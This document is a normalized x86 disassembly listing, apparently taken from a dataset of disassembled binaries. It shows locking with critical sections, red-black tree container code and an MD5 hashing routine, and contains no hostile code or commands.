call [ EnterCriticalSection@IAT ]
mov [ esp + 0x24 ] edi
mov ebx [ esp + 0x2c ]
mov eax [ ebx ]
cmp eax edi
jne r-xdata
mov eax [ eax + 0x4 ]
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x18 ]
push edx
mov ecx esi
mov [ esp + 0x34 ] eax
call sub_41cd50
mov eax [ esp + 0x14 ]
mov esi [ esp + 0x18 ]
cmp eax esi
mov [ esp + 0x2c ] eax
je r-xdata
mov [ esp + 0x24 ] 0xffffffff
push ebp
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
add esp 0x18
retn 0x4
mov [ esp + 0x24 ] 0xffffffff
push ebp
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x1c ]
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x18
retn 0x4
lea ecx [ ecx ]
mov ecx [ eax + 0x10 ]
mov eax [ ebx ]
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
lea ecx [ esp + 0x2c ]
add edi eax
call sub_41c950
mov eax [ esp + 0x2c ]
cmp eax esi
jne r-xdata
sub_41cf10
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_431e04
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x48
push ebp
mov ebp ecx
mov cl [ eax + 0x19 ]
test cl cl
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea ecx [ esp + 0x6c ]
mov [ esp + 0x10 ] ebx
call sub_41c950
mov eax [ ebx ]
mov cl [ eax + 0x19 ]
test cl cl
je r-xdata
push r--data
lea ecx [ esp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x54 ] 0x0
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
call sub_40af50
push r--data
lea ecx [ esp + 0x28 ]
push ecx
call _CxxThrowException
mov edx [ ebx + 0x8 ]
mov cl [ edx + 0x19 ]
test cl cl
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0x6c ]
cmp ecx ebx
mov edi [ ecx + 0x8 ]
jne r-xdata
mov edi eax
jmp r-xdata
mov al [ edi + 0x19 ]
test al al
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ eax + 0x4 ] ecx
mov edx [ ebx ]
mov [ ecx ] edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
mov al [ edi + 0x19 ]
test al al
mov esi [ ecx + 0x4 ]
jne r-xdata
mov esi ecx
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov eax [ ebx + 0x8 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] ecx
mov [ edi + 0x4 ] esi
mov eax [ ebp + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov ebx [ ebp + 0x4 ]
mov eax [ ebx ]
cmp eax [ esp + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x4 ]
mov ecx [ esp + 0x10 ]
cmp [ ebx + 0x8 ] ecx
jne r-xdata
mov al [ edi + 0x19 ]
test al al
je r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov dl [ ebx + 0x18 ]
mov al [ ecx + 0x18 ]
mov [ ecx + 0x18 ] dl
mov [ ebx + 0x18 ] al
mov eax [ esp + 0x10 ]
mov cl [ eax + 0x18 ]
mov bl 0x1
cmp cl bl
jne r-xdata
mov al [ edi + 0x19 ]
test al al
je r-xdata
push edi
call sub_41c920
add esp 0x4
mov eax esi
jmp r-xdata
mov [ esp + 0x60 ] 0xffffffff
mov ecx [ esp + 0x10 ]
add ecx 0xc
call sub_415780
mov eax [ esp + 0x10 ]
push eax
call ??3@YAXPAX@Z
mov eax [ ebp + 0x8 ]
add esp 0x4
test eax eax
pop edi
pop esi
pop ebx
jbe r-xdata
mov ecx [ ebp + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
push edi
call sub_413d60
add esp 0x4
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ ebx ] eax
mov ecx [ esp + 0x60 ]
mov eax [ esp + 0x5c ]
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x54
retn 0x8
dec eax
mov [ ebp + 0x8 ] eax
mov [ edi + 0x18 ] bl
cmp [ edi + 0x18 ] bl
jne r-xdata
mov eax [ esi ]
cmp edi eax
jne r-xdata
mov cl [ eax + 0x18 ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x18 ]
test cl cl
jne r-xdata
mov cl [ eax + 0x19 ]
test cl cl
jne r-xdata
mov [ eax + 0x18 ] bl
push esi
mov ecx ebp
mov [ esi + 0x18 ] 0x0
call sub_413cf0
mov eax [ esi ]
mov cl [ eax + 0x19 ]
test cl cl
jne r-xdata
mov [ eax + 0x18 ] bl
push esi
mov ecx ebp
mov [ esi + 0x18 ] 0x0
call sub_413c80
mov eax [ esi + 0x8 ]
mov edx [ ebp + 0x4 ]
mov eax [ edx + 0x4 ]
mov edi esi
cmp edi eax
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x18 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x18 ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x18 ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x18 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x18 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x18 ] bl
je r-xdata
mov cl [ esi + 0x18 ]
mov [ eax + 0x18 ] cl
mov [ esi + 0x18 ] bl
mov edx [ eax ]
push esi
mov ecx ebp
mov [ edx + 0x18 ] bl
call sub_413cf0
mov edx [ eax + 0x8 ]
mov [ edx + 0x18 ] bl
push eax
mov ecx ebp
mov [ eax + 0x18 ] 0x0
call sub_413c80
mov eax [ esi ]
mov [ eax + 0x18 ] 0x0
mov cl [ esi + 0x18 ]
mov [ eax + 0x18 ] cl
mov [ esi + 0x18 ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx ebp
mov [ edx + 0x18 ] bl
call sub_413c80
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x18 ] bl
push eax
mov ecx ebp
mov [ eax + 0x18 ] 0x0
call sub_413cf0
mov eax [ esi + 0x8 ]
sub_41d1d0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x19 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_41d1d0
mov esi [ esi ]
mov ecx edi
call sub_41cca0
push edi
call ??3@YAXPAX@Z
mov al [ esi + 0x19 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_41d210
push 0xffffffff
push sub_431e18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
mov esi ecx
lea eax [ esi + 0xc ]
push edi
lea ebp [ eax + 0x4 ]
push ebp
mov [ esp + 0x18 ] eax
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x20 ] 0x0
mov eax [ esp + 0x28 ]
mov edi [ eax ]
mov ecx [ edi + 0x4 ]
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x2c ]
mov [ esp + 0x14 ] ecx
push eax
mov ecx esi
call sub_41cce0
mov ebx [ esi + 0x4 ]
mov eax [ esp + 0x28 ]
cmp eax ebx
je r-xdata
mov [ esp + 0x20 ] 0xffffffff
push ebp
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x4
cmp [ eax + 0x10 ] edi
lea ecx [ esp + 0x28 ]
je r-xdata
push eax
push ecx
mov ecx esi
call sub_41cf10
call sub_41c950
mov eax [ esp + 0x28 ]
cmp eax ebx
jne r-xdata
jmp r-xdata
sub_41d2c0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx esi
call sub_41d1d0
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x0
mov [ eax ] eax
mov esi [ esi + 0x4 ]
mov [ esi + 0x8 ] esi
pop esi
retn
sub_41d2f0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x19 ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_41d1d0
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_41cf10
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x19 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x19 ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x19 ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x19 ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x19 ]
test dl dl
je r-xdata
jmp r-xdata
sub_41d3b0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_41d2f0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_41d3e0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_41d2f0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_41d410
push 0xffffffff
push sub_431e38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_41d2f0
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
mov ecx [ esp + 0xc ]
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41d470
push 0xffffffff
push sub_431e58
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_41caf0
mov [ esi + 0x4 ] eax
mov [ eax + 0x19 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41d4d0
push 0xffffffff
push sub_431e83
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_41d470
mov [ esp + 0x10 ] 0x0
lea eax [ esi + 0x10 ]
push eax
mov [ esi + 0xc ] r--data
call [ InitializeCriticalSection@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41d530
push 0xffffffff
push sub_431ea3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
lea eax [ esi + 0x10 ]
push eax
mov [ esi + 0xc ] r--data
call [ DeleteCriticalSection@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call sub_41d410
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_41d590
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_431ebe
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
mov [ esp + 0x8 ] 0x0
mov ecx rw-data
call sub_41d4d0
push sub_4340b0
call sub_42e6e6
add esp 0x4
mov [ esp + 0x8 ] 0xffffffff
sub_41d600
mov edx ecx
push edi
xor eax eax
mov ecx 0x10
lea edi [ edx + 0x18 ]
mov [ edx + 0x10 ] eax
mov [ edx + 0x14 ] eax
mov [ edx ] 0x67452301
mov [ edx + 0x4 ] 0xefcdab89
mov [ edx + 0x8 ] 0x98badcfe
mov [ edx + 0xc ] 0x10325476
[ edi ]
pop edi
retn
sub_41d640
mov edx [ esp + 0xc ]
test edx edx
jbe r-xdata
retn 0xc
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
push esi
lea esi [ edx - 0x1 ]
shr esi 0x2
inc ecx
add eax 0x2
inc esi
lea esp [ esp ]
mov dl [ eax - 0x2 ]
mov [ ecx - 0x1 ] dl
mov dl [ eax - 0x1 ]
mov [ ecx ] dl
mov dl [ eax ]
mov [ ecx + 0x1 ] dl
mov dl [ eax + 0x1 ]
mov [ ecx + 0x2 ] dl
add eax 0x4
add ecx 0x4
dec esi
jne r-xdata
pop esi
sub_41d690
mov ecx [ esp + 0xc ]
test ecx ecx
jbe r-xdata
retn 0xc
mov eax [ esp + 0x8 ]
add eax 0x2
dec ecx
push esi
mov esi [ esp + 0x8 ]
shr ecx 0x2
push edi
inc ecx
lea ebx [ ebx ]
movzx edi [ eax - 0x1 ]
xor edx edx
mov dh [ eax + 0x1 ]
add esi 0x4
add eax 0x4
mov dl [ eax - 0x4 ]
shl edx 0x8
or edx edi
movzx edi [ eax - 0x6 ]
shl edx 0x8
or edx edi
dec ecx
mov [ esi - 0x4 ] edx
jne r-xdata
pop edi
pop esi
sub_41d6e0
mov edx ecx
xor eax eax
push edi
mov [ edx + 0x10 ] eax
mov [ edx + 0x14 ] eax
mov ecx 0x10
lea edi [ edx + 0x18 ]
mov [ edx ] 0x67452301
mov [ edx + 0x4 ] 0xefcdab89
mov [ edx + 0x8 ] 0x98badcfe
mov [ edx + 0xc ] 0x10325476
[ edi ]
mov eax edx
pop edi
retn
sub_41d720
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
sub esp 0x40
push ebx
push ebp
push esi
push edi
add ecx 0x2
lea esi [ esp + 0x10 ]
mov edi 0x10
jmp r-xdata
movzx ebx [ ecx - 0x1 ]
xor edx edx
mov dh [ ecx + 0x1 ]
add esi 0x4
add ecx 0x4
mov dl [ ecx - 0x4 ]
shl edx 0x8
or edx ebx
movzx ebx [ ecx - 0x6 ]
shl edx 0x8
or edx ebx
dec edi
mov [ esi - 0x4 ] edx
jne r-xdata
mov esi [ eax + 0x4 ]
mov edi [ eax + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ eax ]
mov ebp [ esp + 0x10 ]
mov ebx edi
and ebx esi
mov ecx esi
not ecx
and ecx edx
or ecx ebx
add ecx ebp
lea ecx [ eax + ecx - 0x28955b88 ]
mov ebp [ esp + 0x14 ]
mov eax ecx
shl ecx 0x7
shr eax 0x19
or eax ecx
add eax esi
mov ecx eax
not ecx
and ecx edi
mov ebx esi
and ebx eax
or ecx ebx
add ecx ebp
mov ebp [ esp + 0x18 ]
lea edx [ edx + ecx - 0x173848aa ]
mov ecx edx
shl edx 0xc
shr ecx 0x14
or ecx edx
add ecx eax
mov edx ecx
not edx
and edx esi
mov ebx ecx
and ebx eax
or edx ebx
add edx ebp
lea edi [ edi + edx + 0x242070db ]
mov edx edi
mov ebp [ esp + 0x1c ]
shl edi 0x11
shr edx 0xf
or edx edi
add edx ecx
mov edi edx
not edi
and edi eax
mov ebx ecx
and ebx edx
or edi ebx
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ esi + edi - 0x3e423112 ]
mov esi edi
shr edi 0xa
shl esi 0x16
or esi edi
add esi edx
mov edi esi
not edi
and edi ecx
mov ebx edx
and ebx esi
or edi ebx
add edi ebp
mov ebp [ esp + 0x24 ]
lea edi [ eax + edi - 0xa83f051 ]
mov eax edi
shl edi 0x7
shr eax 0x19
or eax edi
add eax esi
mov edi eax
not edi
mov ebx esi
and edi edx
and ebx eax
or edi ebx
add edi ebp
lea edi [ ecx + edi + 0x4787c62a ]
mov ecx edi
shl edi 0xc
mov ebp [ esp + 0x28 ]
shr ecx 0x14
or ecx edi
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi ebp
lea edi [ edx + edi - 0x57cfb9ed ]
mov edx edi
shl edi 0x11
mov ebp [ esp + 0x2c ]
shr edx 0xf
or edx edi
add edx ecx
mov edi edx
not edi
and edi eax
mov ebx ecx
and ebx edx
or edi ebx
add edi ebp
lea edi [ esi + edi - 0x2b96aff ]
mov esi edi
shr edi 0xa
mov ebp [ esp + 0x30 ]
shl esi 0x16
or esi edi
add esi edx
mov ebx edx
and ebx esi
mov edi esi
not edi
and edi ecx
or edi ebx
add edi ebp
lea edi [ eax + edi + 0x698098d8 ]
mov ebp [ esp + 0x34 ]
mov eax edi
shl edi 0x7
shr eax 0x19
or eax edi
add eax esi
mov edi eax
not edi
and edi edx
mov ebx esi
and ebx eax
or edi ebx
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ ecx + edi - 0x74bb0851 ]
mov ecx edi
shl edi 0xc
shr ecx 0x14
or ecx edi
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi ebp
lea edi [ edx + edi - 0xa44f ]
mov edx edi
shl edi 0x11
shr edx 0xf
or edx edi
add edx ecx
mov edi edx
not edi
and edi eax
mov ebx ecx
mov ebp [ esp + 0x3c ]
and ebx edx
or edi ebx
add edi ebp
lea edi [ esi + edi - 0x76a32842 ]
mov esi edi
shr edi 0xa
mov ebp [ esp + 0x40 ]
shl esi 0x16
or esi edi
add esi edx
mov edi esi
not edi
and edi ecx
mov ebx edx
and ebx esi
or edi ebx
add edi ebp
lea edi [ eax + edi + 0x6b901122 ]
mov ebp [ esp + 0x44 ]
mov eax edi
shl edi 0x7
shr eax 0x19
or eax edi
add eax esi
mov edi eax
not edi
and edi edx
mov ebx esi
and ebx eax
or edi ebx
add edi ebp
lea edi [ ecx + edi - 0x2678e6d ]
mov ecx edi
shl edi 0xc
shr ecx 0x14
or ecx edi
add ecx eax
mov edi ecx
not edi
mov ebx edi
and ebx esi
mov ebp ecx
and ebp eax
or ebx ebp
add ebx [ esp + 0x48 ]
lea ebx [ edx + ebx - 0x5986bc72 ]
mov edx ebx
shl ebx 0x11
shr edx 0xf
or edx ebx
add edx ecx
mov ebx edx
not ebx
mov [ esp + 0x58 ] ebx
and ebx eax
mov ebp ecx
and ebp edx
or ebx ebp
mov ebp [ esp + 0x4c ]
add ebx ebp
lea ebx [ esi + ebx + 0x49b40821 ]
mov esi ebx
shr ebx 0xa
shl esi 0x16
or esi ebx
and edi edx
add esi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ esp + 0x14 ]
lea edi [ eax + edi - 0x9e1da9e ]
mov eax edi
shl edi 0x5
shr eax 0x1b
or eax edi
mov edi [ esp + 0x58 ]
add eax esi
and edi esi
mov ebx edx
and ebx eax
or edi ebx
add edi [ esp + 0x28 ]
lea edi [ ecx + edi - 0x3fbf4cc0 ]
mov ecx edi
shl edi 0x9
shr ecx 0x17
or ecx edi
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ esp + 0x3c ]
lea edi [ edx + edi + 0x265e5a51 ]
mov edx edi
shl edi 0xe
shr edx 0x12
or edx edi
add edx ecx
mov edi eax
not edi
and edi ecx
mov ebx edx
and ebx eax
or edi ebx
add edi [ esp + 0x10 ]
lea edi [ esi + edi - 0x16493856 ]
mov esi edi
shr edi 0xc
shl esi 0x14
or esi edi
add esi edx
mov edi ecx
not edi
and edi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ esp + 0x24 ]
lea edi [ eax + edi - 0x29d0efa3 ]
mov eax edi
shl edi 0x5
shr eax 0x1b
or eax edi
mov edi edx
not edi
and edi esi
mov ebx edx
add eax esi
and ebx eax
or edi ebx
add edi [ esp + 0x38 ]
lea edi [ ecx + edi + 0x2441453 ]
mov ecx edi
shl edi 0x9
shr ecx 0x17
or ecx edi
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi ebp
lea edi [ edx + edi - 0x275e197f ]
mov edx edi
shr edx 0x12
shl edi 0xe
or edx edi
add edx ecx
mov edi eax
not edi
and edi ecx
mov ebx edx
and ebx eax
or edi ebx
add edi [ esp + 0x20 ]
lea edi [ esi + edi - 0x182c0438 ]
mov esi edi
shr edi 0xc
shl esi 0x14
or esi edi
add esi edx
mov edi ecx
not edi
and edi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ esp + 0x34 ]
lea edi [ eax + edi + 0x21e1cde6 ]
mov eax edi
shl edi 0x5
shr eax 0x1b
or eax edi
add eax esi
mov edi edx
not edi
and edi esi
mov ebx edx
and ebx eax
or edi ebx
add edi [ esp + 0x48 ]
lea edi [ ecx + edi - 0x3cc8f82a ]
mov ecx edi
shl edi 0x9
shr ecx 0x17
or ecx edi
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ esp + 0x1c ]
lea edi [ edx + edi - 0xb2af279 ]
mov edx edi
shl edi 0xe
shr edx 0x12
or edx edi
add edx ecx
mov edi eax
not edi
and edi ecx
mov ebx edx
and ebx eax
or edi ebx
add edi [ esp + 0x30 ]
lea edi [ esi + edi + 0x455a14ed ]
mov esi edi
shr edi 0xc
shl esi 0x14
or esi edi
mov edi ecx
not edi
add esi edx
and edi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ esp + 0x44 ]
lea edi [ eax + edi - 0x561c16fb ]
mov eax edi
shr eax 0x1b
shl edi 0x5
or eax edi
add eax esi
mov edi edx
not edi
and edi esi
mov ebx edx
and ebx eax
or edi ebx
add edi [ esp + 0x18 ]
lea edi [ ecx + edi - 0x3105c08 ]
mov ecx edi
shl edi 0x9
shr ecx 0x17
or ecx edi
add ecx eax
mov ebx ecx
and ebx esi
mov edi esi
not edi
and edi eax
or edi ebx
add edi [ esp + 0x2c ]
lea edi [ edx + edi + 0x676f02d9 ]
mov edx edi
shl edi 0xe
shr edx 0x12
or edx edi
add edx ecx
mov edi eax
not edi
and edi ecx
mov ebx edx
and ebx eax
or edi ebx
add edi [ esp + 0x40 ]
mov ebx [ esp + 0x24 ]
lea edi [ esi + edi - 0x72d5b376 ]
mov esi edi
shr edi 0xc
shl esi 0x14
or esi edi
mov edi ecx
xor edi edx
add esi edx
xor edi esi
add edi ebx
mov ebx [ esp + 0x30 ]
lea edi [ eax + edi - 0x5c6be ]
mov eax edi
shl edi 0x4
shr eax 0x1c
or eax edi
mov edi edx
xor edi esi
add eax esi
xor edi eax
add edi ebx
mov ebx [ esp + 0x3c ]
lea ecx [ ecx + edi - 0x788e097f ]
mov edi ecx
shl ecx 0xb
shr edi 0x15
or edi ecx
add edi eax
mov ecx edi
xor ecx esi
xor ecx eax
add ecx ebx
lea ecx [ edx + ecx + 0x6d9d6122 ]
mov edx ecx
shr edx 0x10
shl ecx 0x10
or edx ecx
add edx edi
mov ebx edi
xor ebx edx
mov ecx ebx
xor ecx eax
add ecx [ esp + 0x48 ]
lea esi [ esi + ecx - 0x21ac7f4 ]
mov ecx esi
shr esi 0x9
shl ecx 0x17
or ecx esi
mov esi [ esp + 0x14 ]
add ecx edx
xor ebx ecx
add ebx esi
lea ebx [ eax + ebx - 0x5b4115bc ]
mov eax ebx
shl ebx 0x4
shr eax 0x1c
or eax ebx
mov ebx [ esp + 0x20 ]
add eax ecx
mov esi edx
xor esi ecx
xor esi eax
add esi ebx
lea edi [ edi + esi + 0x4bdecfa9 ]
mov esi edi
shl edi 0xb
mov ebx [ esp + 0x2c ]
shr esi 0x15
or esi edi
add esi eax
mov edi esi
xor edi ecx
xor edi eax
add edi ebx
lea edi [ edx + edi - 0x944b4a0 ]
mov edx edi
shl edi 0x10
shr edx 0x10
or edx edi
add edx esi
mov edi esi
xor edi edx
mov ebx edi
xor ebx eax
add ebx [ esp + 0x38 ]
lea ebx [ ecx + ebx - 0x41404390 ]
mov ecx ebx
shr ebx 0x9
shl ecx 0x17
or ecx ebx
mov ebx [ esp + 0x44 ]
add ecx edx
xor edi ecx
add edi ebx
mov ebx [ esp + 0x10 ]
lea edi [ eax + edi + 0x289b7ec6 ]
mov eax edi
shl edi 0x4
shr eax 0x1c
or eax edi
mov edi edx
xor edi ecx
add eax ecx
xor edi eax
add edi ebx
mov ebx [ esp + 0x1c ]
lea edi [ esi + edi - 0x155ed806 ]
mov esi edi
shl edi 0xb
shr esi 0x15
or esi edi
add esi eax
mov edi esi
xor edi ecx
xor edi eax
add edi ebx
lea edx [ edx + edi - 0x2b10cf7b ]
mov edi edx
shr edi 0x10
shl edx 0x10
or edi edx
add edi esi
mov edx esi
xor edx edi
mov ebx edx
xor ebx eax
add ebx [ esp + 0x28 ]
lea ebx [ ecx + ebx + 0x4881d05 ]
mov ecx ebx
shr ebx 0x9
shl ecx 0x17
or ecx ebx
add ecx edi
mov ebx [ esp + 0x34 ]
xor edx ecx
add edx ebx
mov ebx [ esp + 0x40 ]
lea edx [ eax + edx - 0x262b2fc7 ]
mov eax edx
shl edx 0x4
shr eax 0x1c
or eax edx
mov edx edi
xor edx ecx
add eax ecx
xor edx eax
add edx ebx
lea esi [ esi + edx - 0x1924661b ]
mov edx esi
shl esi 0xb
mov ebx [ esp + 0x18 ]
shr edx 0x15
or edx esi
add edx eax
mov esi edx
xor esi ecx
xor esi eax
add esi ebp
lea edi [ edi + esi + 0x1fa27cf8 ]
mov esi edi
shl edi 0x10
shr esi 0x10
or esi edi
add esi edx
mov edi edx
xor edi esi
xor edi eax
add edi ebx
lea edi [ ecx + edi - 0x3b53a99b ]
mov ebx [ esp + 0x10 ]
mov ecx edi
shr edi 0x9
shl ecx 0x17
or ecx edi
mov edi edx
not edi
add ecx esi
or edi ecx
xor edi esi
add edi ebx
mov ebx [ esp + 0x2c ]
lea edi [ eax + edi - 0xbd6ddbc ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi ebx
mov ebx [ esp + 0x48 ]
lea edi [ edx + edi + 0x432aff97 ]
mov edx edi
shl edi 0xa
shr edx 0x16
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi ebx
lea edi [ esi + edi - 0x546bdc59 ]
mov esi edi
shl edi 0xf
mov ebx [ esp + 0x24 ]
shr esi 0x11
or esi edi
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi ebx
lea edi [ ecx + edi - 0x36c5fc7 ]
mov ecx edi
shr edi 0xb
mov ebx [ esp + 0x40 ]
shl ecx 0x15
or ecx edi
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi ebx
lea edi [ eax + edi + 0x655b59c3 ]
mov eax edi
shl edi 0x6
mov ebx [ esp + 0x1c ]
shr eax 0x1a
or eax edi
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi ebx
